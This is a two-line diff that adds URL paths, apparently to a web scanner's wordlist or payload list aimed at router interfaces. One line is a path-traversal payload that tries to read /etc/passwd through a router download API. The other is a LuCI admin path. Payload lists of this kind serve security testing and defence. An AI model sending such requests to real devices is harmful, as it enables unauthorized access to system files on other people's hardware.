@@ -1,0 +1,2 @@
+/api-third-party/download/extdisks../etc/passwd
+/cgi-bin/luci/web
